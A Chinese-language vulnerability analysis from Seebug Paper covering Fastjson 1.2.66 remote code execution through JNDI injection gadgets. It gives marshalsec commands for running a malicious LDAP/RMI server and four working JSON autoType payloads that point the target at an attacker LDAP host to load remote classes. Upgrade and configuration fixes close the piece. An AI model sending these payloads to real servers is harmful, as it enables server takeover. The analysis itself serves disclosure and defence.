**作者：Ja0k@SecurityCN**  
**时间：2020年3月22日**

#### 一、事件背景

近日，Fastjson发布了新版本1.2.67新增了autoType黑名单，在1.2.66及之前版本中存在大量通过JNDI注入绕过黑名单限制的而导致远程代码执行漏洞，远程攻击者可以通过构造的攻击代码触发远程代码执行漏洞，最终可以获取到服务器的控制权限。

#### 二、漏洞信息

漏洞名称 | Fastjson 远程代码执行漏洞  
---|---  
CVE编号 | -  
影响范围 | <=1.2.66  
威胁等级 | 高危  
公开时间 | 2020年3月19日  
  
#### 三、漏洞分析

##### 补丁对比

![](https://images.seebug.org/content/images/2020/03/96863df4-dfe8-4dbb-b88a-45f74af11f2e.png-w331s)

通过对比1.2.66和1.2.67版本ParserConfig.java文件中checkautotype类的denyHashCode发现新增了16个黑名单Gadget

![](https://images.seebug.org/content/images/2020/03/2b97aa06-0bb9-4433-920b-8265e349fd52.png-w331s)

注：1.2.42版本之前的黑名单是以denyList形式，存在被黑客利用里面Gadget来攻击低版本的fastjson风险，之后版本码中黑名单都是以hashCode的方式存放在源码里，denyHashCode的计算方式略微复杂，增加了攻击门槛。

jndi注入产生的原因可以归结到以下4点

  1. lookup参数可控。
  2. InitialContext类及他的子类的lookup方法允许动态协议转换
  3. lookup查找的对象是Reference类型及其子类
  4. 当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。

就可以实现远程加载恶意的对象，实现远程代码执行。 我们发现存在3种方法，可以通过jndi注入导致远程代码执行:

  1. rmi、通过jndi reference远程调用object方法
  2. LDAP 通过序列化对象，JNDI Referene，ldap地址
  3. CORBA IOR 远程获取实现类

可以使用marshalsec-0.0.3-SNAPSHOT-all.jar开启rmi/ldap 调用web服务器中的恶意对象

1.LDAP 方式

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer

<http://127.0.0.1:8000/#Calc>

2.RMI 方式

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer

<http://127.0.0.1:8000/#Calc>

本次将分析已公开的4个Gadget `JndiObjectFactory`、`AnterosDBCPConfig`
、`CacheJndiTmLookup`和`JtaTransactionConfig`

黑名单里有10几个Gadget，后续慢慢研究

###### 1\. org.apache.shiro.jndi.JndiObjectFactory

在org.apache.shiro-core-1.5.1.jar 包中

![](https://images.seebug.org/content/images/2020/03/5b88564e-985d-457b-a94a-fc1e1b3884df.png-w331s)

    
    
        public T getInstance() {
            try {
                if(requiredType != null) {
                    return requiredType.cast(this.lookup(resourceName, requiredType));
                } else {
                    return (T) this.lookup(resourceName);
                }

resourceName 参数可控 poc构造1:

    
    
    {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

###### 2\. br.com.anteros.dbcp.AnterosDBCPConfig

找lookup

![](https://images.seebug.org/content/images/2020/03/de2679ff-3131-4fca-abeb-ac3ad2c34593.png-w331s)

get Object Or Perform Jndi Look up

    
    
       private Object getObjectOrPerformJndiLookup(Object object)
       {
          if (object instanceof String) {
             try {
                InitialContext initCtx = new InitialContext();
                return initCtx.lookup((String) object);
             }
             catch (NamingException e) {
                throw new IllegalArgumentException(e);
             }
          }
          return object;

跟一下调用，发现是传递参数为metric Registry poc构造2:

    
    
    {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

![](https://images.seebug.org/content/images/2020/03/43f4361c-7509-4e67-a1b0-fa5c6710be9f.png-w331s)

###### 3\. org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup

![](https://images.seebug.org/content/images/2020/03/2b0732b1-b1c5-468c-9095-84f6f4133956.png-w331s)

s 的值为列表jndiNames经过iterator().next遍历返回的对象序列再转化为Sting，jndiNames也是可控 poc构造3:

    
    
    {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

###### 4\. com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig

![](https://images.seebug.org/content/images/2020/03/cbc7642e-498c-4958-97d7-7f071791e0b3.png-w331s)

    
    
      public void setProperties(Properties props) throws SQLException, TransactionException {
        String utxName = null;
        try {
          utxName = (String) props.get("UserTransaction");
          InitialContext initCtx = new InitialContext();
          userTransaction = (UserTransaction) initCtx.lookup(utxName);
        } catch (NamingException e) {
          throw new SqlMapException("Error initializing JtaTransactionConfig while looking up UserTransaction (" + utxName + ").  Cause: " + e);
        }
      }

User Transaction参数 可控 poc构造4:

    
    
    {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}

#### 四、漏洞复现

**本次复现fastsjon 1.2.66版本 为例**

![](https://images.seebug.org/content/images/2020/03/62c084b5-7d82-4c81-8841-387ded5d4ce1.png-w331s)

第1个： fastjson 受`org.apache.shiro.jndi.JndiObjectFactory`影响导致RCE

![](https://images.seebug.org/content/images/2020/03/a2306559-f53b-46bc-b83c-d26a0bf2f93c.png-w331s)

第2个： fastjson 受`br.com.anteros.dbcp.AnterosDBCPConfig`影响导致RCE

![](https://images.seebug.org/content/images/2020/03/233022f3-a3d5-4d19-af88-5c3aa9679ff8.png-w331s)

第3个： fastjson 受`org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup`影响导致RCE

![](https://images.seebug.org/content/images/2020/03/3e6d259b-ffae-4704-ba02-d588d76a376a.png-w331s)

第4个： fastjson
受`com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig`影响导致RCE

![](https://images.seebug.org/content/images/2020/03/7e6f99f8-712d-433c-826f-9db09d18a1b1.png-w331s)

#### 五、修复建议

1.官方已发布新版本 <https://github.com/alibaba/fastjson/releases/tag/1.2.67>

2 修复建议 Fastjson默认关闭autotype，如果项目中不需要该功能，可以删除以下代码：
`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`;

#### 六、附录

**本次分析及复现的相关工具地址**  
<https://github.com/SecurityCN/Vulnerability-analysis/tree/master/fastjson>

**参考：**

  1. <https://github.com/alibaba/fastjson/releases>

  2. <https://mp.weixin.qq.com/s/4JzPRolR0cELL5g9bWM_eA>

  3. <https://github.com/threedr3am/learnjavabug>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1155/>

